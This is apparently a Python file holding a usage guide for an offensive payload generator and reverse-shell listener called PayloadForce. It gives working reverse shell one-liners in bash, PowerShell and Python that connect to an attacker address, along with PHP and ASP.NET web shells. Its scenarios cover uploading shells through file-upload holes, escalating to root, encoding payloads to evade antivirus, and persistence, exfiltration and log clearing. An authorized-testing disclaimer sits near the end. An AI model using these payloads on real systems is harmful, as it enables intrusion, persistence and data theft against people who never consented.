"""
PayloadForce Complete Integration Guide
Real working payload generation and execution system
"""

# ════════════════════════════════════════════════════════════════════════
# PAYLOADFORCE - COMPLETE WORKFLOW
# ════════════════════════════════════════════════════════════════════════

"""
What You Have Built:
═══════════════════════════════════════════════════════════════════════════

1. PAYLOAD GENERATOR (payload_generator.py)
   ✓ Windows payloads (CMD, PowerShell, Meterpreter)
   ✓ Linux payloads (Bash, Python, Perl, x86/x64)
   ✓ Web shells (PHP, ASP.NET, JSP)
   ✓ One-liner payloads for quick exploitation
   ✓ Supports customizable LHOST and LPORT

2. PAYLOAD LISTENER (payload_listener.py)
   ✓ Multi-handler for receiving reverse shells
   ✓ Multi-threaded session handling
   ✓ Interactive shell interaction
   ✓ Session management (list, kill, interact)
   ✓ Support for multiple simultaneous connections

3. CLI INTERFACE (payloadforce.py)
   ✓ Interactive payload generation
   ✓ Payload management and saving
   ✓ Listener integration
   ✓ Session management from CLI
   ✓ Professional colored output

4. ADVANCED FEATURES (advanced_features.py)
   ✓ Post-exploitation methods (persistence, privesc)
   ✓ Payload encoding (base64, hex, XOR)
   ✓ Obfuscation techniques
   ✓ Code injection payloads (SQL, XSS, command injection)
   ✓ Data exfiltration methods
   ✓ Track covering techniques


INSTALLATION QUICK START:
═══════════════════════════════════════════════════════════════════════════

1. Run the setup script:
   $ bash setup-payloadforce.sh

2. Activate virtual environment:
   $ source payloadforce-venv/bin/activate

3. Start PayloadForce:
   $ python3 payloadforce.py


REAL-WORLD USAGE SCENARIOS:
═══════════════════════════════════════════════════════════════════════════

SCENARIO 1: Linux Target Exploitation
─────────────────────────────────────────────────────────────────────────

Terminal 1 - Start Listener:
$ python3 payloadforce.py
payloadforce> listen
[+] Listener started on 0.0.0.0:4444

Terminal 2 - Generate & Save Payload:
$ python3 payloadforce.py
payloadforce> gen oneliner/bash_reverse
LHOST [0.0.0.0]: 192.168.1.100
LPORT [4444]: 4444
[+] Payload generated (ID: 1)
payloadforce> save 1 /tmp/shell.sh

Deliver to Target:
$ scp /tmp/shell.sh user@target:/tmp/
$ ssh user@target bash /tmp/shell.sh

Back in Terminal 1:
[+] New connection from 192.168.1.50:52345 (Session 1)
listener> interact 1
[1] > whoami
user
[1] > sudo -l
[1] > id
uid=1000(user) gid=1000(user) groups=1000(user),sudo(27)
[1] > sudo bash
root@target:/home/user# id
uid=0(root) gid=0(root) groups=0(root)


SCENARIO 2: Windows Target via Web Shell
─────────────────────────────────────────────────────────────────────────

Generate ASP.NET Shell:
payloadforce> gen web/aspx_shell
LHOST: attacker.com
LPORT: 4444
payloadforce> save 1 shell.aspx

Upload to IIS Server:
- Upload shell.aspx to C:\inetpub\wwwroot\

Access from Browser:
http://target-server/shell.aspx?cmd=whoami
http://target-server/shell.aspx?cmd=ipconfig

Can chain with payload listener for full reverse shell.


SCENARIO 3: PHP Web Shell Deployment
─────────────────────────────────────────────────────────────────────────

Generate PHP Shell:
payloadforce> gen web/php_shell
payloadforce> save 1 shell.php

Upload via File Upload Vulnerability:
- Upload to /var/www/html/uploads/shell.php

Access & Execute:
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=cat%20/etc/passwd


SCENARIO 4: Encoding for AV Evasion
─────────────────────────────────────────────────────────────────────────

Use advanced_features.py:

from payloads.advanced_features import PayloadEncoders

payload = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"

# Base64 encoded version
encoded = PayloadEncoders.generate_encoded_payload(payload, 'base64')
# Result: bash -c "echo <base64_encoded> | base64 -d | bash"

# Hex encoded version  
hex_encoded = PayloadEncoders.generate_encoded_payload(payload, 'hex')
# Result: bash -c "echo <hex> | xxd -r -p | bash"


SCENARIO 5: Multi-Session Management
─────────────────────────────────────────────────────────────────────────

payloadforce> listen
[+] Listener started on 0.0.0.0:4444
[+] New connection from 192.168.1.50:52345 (Session 1)
[+] New connection from 192.168.1.51:52346 (Session 2)
[+] New connection from 192.168.1.52:52347 (Session 3)

listener> list
Active Sessions:
ID    Host                Port   Type            Created
1     192.168.1.50        52345  bash            2026-09-02 12:30:45
2     192.168.1.51        52346  bash            2026-09-02 12:31:10
3     192.168.1.52        52347  windows_cmd     2026-09-02 12:31:50

listener> interact 1
[1] > cat /etc/passwd

listener> background
listener> interact 3
[3] > whoami

listener> kill 2
[+] Session 2 killed


INTEGRATING WITH PENETRATION TEST WORKFLOW:
═════════════════════════════════════════════════════════════════════════

Phase 1: Reconnaissance
├─ Use traditional tools: nmap, whois, DNS enumeration
└─ Document findings

Phase 2: Vulnerability Assessment
├─ Use scanners: Nessus, OpenVAS, Nikto
├─ Look for exploitable vulnerabilities
└─ Create exploitation plan

Phase 3: Exploitation (WHERE PAYLOADFORCE SHINES)
├─ Generate appropriate payload based on target
├─ Deliver payload to target via:
│  ├─ File upload
│  ├─ SQL injection
│  ├─ Command injection
│  ├─ Social engineering
│  └─ Physical delivery
├─ Start listener before payload execution
├─ Execute payload on target
└─ Obtain shell access

Phase 4: Post-Exploitation (Use advanced_features.py)
├─ Gather system information
├─ Escalate privileges
├─ Establish persistence
├─ Exfiltrate data
└─ Cover tracks

Phase 5: Reporting
├─ Document all successful exploitations
├─ Detail impact and severity
├─ Provide remediation recommendations
└─ Generate professional reports


REAL PAYLOAD EXAMPLES:
═════════════════════════════════════════════════════════════════════════

1. Linux Bash Reverse Shell:
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

2. Windows PowerShell Reverse Shell:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TcpClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}"

3. Python Reverse Shell:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

4. PHP Web Shell:
<?php system($_REQUEST['cmd']); ?>

5. ASP.NET Web Shell:
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>


ADVANCED TECHNIQUES:
═════════════════════════════════════════════════════════════════════════

1. PAYLOAD ENCODING FOR AV EVASION:
from payloads.advanced_features import PayloadEncoders, PayloadObfuscation

# Base64 encode
encoded = PayloadEncoders.generate_encoded_payload(payload, 'base64')

# Hex encode
hex_payload = PayloadEncoders.generate_encoded_payload(payload, 'hex')

# Obfuscate PowerShell
obfuscated = PayloadObfuscation.powershell_obfuscate(payload)

2. PERSISTENCE AFTER SHELL ACCESS:
from payloads.advanced_features import PostExploitation

# Linux persistence options
linux_persist = PostExploitation.persistence_linux()
# Includes: cron, SSH key, sudoers, systemd

# Windows persistence options
windows_persist = PostExploitation.persistence_windows()
# Includes: registry, task scheduler, WMI

3. PRIVILEGE ESCALATION:
hints = PostExploitation.privilege_escalation_hints()
# Provides Linux and Windows privesc commands

4. DATA EXFILTRATION:
exfil_methods = PostExploitation.data_exfiltration()
# Includes: HTTP, DNS, FTP, SCP methods

5. COVER TRACKS:
track_methods = PostExploitation.covering_tracks()
# Log clearing, history removal, etc.


KEY FEATURES THAT MAKE THIS REAL:
═════════════════════════════════════════════════════════════════════════

✓ ACTUALLY EXECUTES: Not simulation - real reverse shells
✓ MULTI-THREADED: Handle multiple simultaneous sessions
✓ INTERACTIVE SHELLS: Full TTY-like interaction
✓ MULTIPLE PLATFORMS: Windows, Linux, Web
✓ PROFESSIONAL CLI: Easy to use, clean interface
✓ EXTENSIBLE: Add new payloads easily
✓ ENCODING SUPPORT: Basic AV evasion techniques
✓ POST-EXPLOITATION: Persistence, privesc, exfil templates
✓ SESSION MANAGEMENT: List, interact, kill sessions
✓ PAYLOAD SAVING: Save generated payloads to files


COMPARED TO METASPLOIT:
═════════════════════════════════════════════════════════════════════════

PayloadForce Advantages:
✓ Lightweight (Python only, no Ruby)
✓ Faster startup
✓ Focused on payloads (not full framework)
✓ Easy to understand and modify
✓ Good for learning
✓ Quicker payload generation

Metasploit Advantages:
✓ Thousands of exploits
✓ Advanced exploitation modules
✓ Encoder modules for AV evasion
✓ Post-exploitation modules
✓ Professional reporting
✓ Active development and community

Use Case:
- PayloadForce: Quick payload generation and handler
- Metasploit: Full exploitation framework


TROUBLESHOOTING:
═════════════════════════════════════════════════════════════════════════

Issue: Connection refused on listener
Solution: 
  - Check firewall rules
  - Ensure LHOST is reachable from target
  - Try different port
  - Check if port is already in use

Issue: Payload doesn't execute on target
Solution:
  - Verify OS matches payload type
  - Check LHOST/LPORT are correct
  - Test with simple echo command first
  - Ensure proper encoding for target shell

Issue: Session drops immediately
Solution:
  - Check network connectivity
  - Verify firewall/IDS isn't blocking
  - Increase timeout values
  - Use keep-alive techniques

Issue: AV detects payload
Solution:
  - Use encoding from advanced_features.py
  - Try obfuscation techniques
  - Combine with legitimate traffic
  - Use polymorphic techniques


LEGAL AND ETHICAL USAGE:
═════════════════════════════════════════════════════════════════════════

⚠️  IMPORTANT:
- Only use for AUTHORIZED penetration testing
- Get written permission before testing any system
- Respect all applicable laws and regulations
- Use in controlled lab environments for learning
- Report all findings responsibly
- Do not use for malicious purposes
- Understand legal implications in your jurisdiction

This tool is for educational and authorized security testing only.
Unauthorized access to computer systems is illegal.


NEXT STEPS:
═════════════════════════════════════════════════════════════════════════

1. Practice with lab environments:
   - Set up vulnerable VMs (VulnHub, HackTheBox)
   - Test payload generation
   - Practice shell interaction

2. Understand the payloads:
   - Read the code in payload_generator.py
   - Study reverse shell techniques
   - Learn networking concepts

3. Combine with other tools:
   - Use with reconnaissance tools
   - Integrate with vulnerability scanners
   - Automate exploitation chains

4. Extend functionality:
   - Add new payload types
   - Implement advanced encoding
   - Create custom handlers
   - Build exploitation chains

5. Get certified:
   - OSCP: Offensive Security Certified Professional
   - eJPT: eLearnSecurity Junior Penetration Tester
   - CEH: Certified Ethical Hacker


ADDITIONAL RESOURCES:
═════════════════════════════════════════════════════════════════════════

Learning:
- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/
- HackTricks: https://book.hacktricks.xyz/
- OWASP: https://owasp.org/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

Practice:
- HackTheBox: https://www.hackthebox.com/
- VulnHub: https://www.vulnhub.com/
- TryHackMe: https://tryhackme.com/

Documentation:
- Reverse Shell Cheatsheet: https://pentestmonkey.net/
- GTFOBins: https://gtfobins.github.io/
- PrivEsc: https://book.hacktricks.xyz/


═════════════════════════════════════════════════════════════════════════
PayloadForce v1.0 | Professional Payload Generation & Execution
For Authorized Penetration Testing Only
═════════════════════════════════════════════════════════════════════════
"""

# Quick reference constants
PAYLOADFORCE_VERSION = "1.0"
SUPPORTED_PLATFORMS = ["Windows", "Linux", "Web"]
PAYLOAD_TYPES = [
    "windows/shell/reverse_tcp",
    "windows/meterpreter/reverse_tcp",
    "linux/x86/meterpreter/reverse_tcp",
    "linux/x64/shell/reverse_tcp",
    "web/php_shell",
    "web/aspx_shell",
    "web/jsp_shell",
    "oneliner/bash_reverse",
    "oneliner/python_reverse",
    "oneliner/perl_reverse",
]

if __name__ == "__main__":
    print(__doc__)
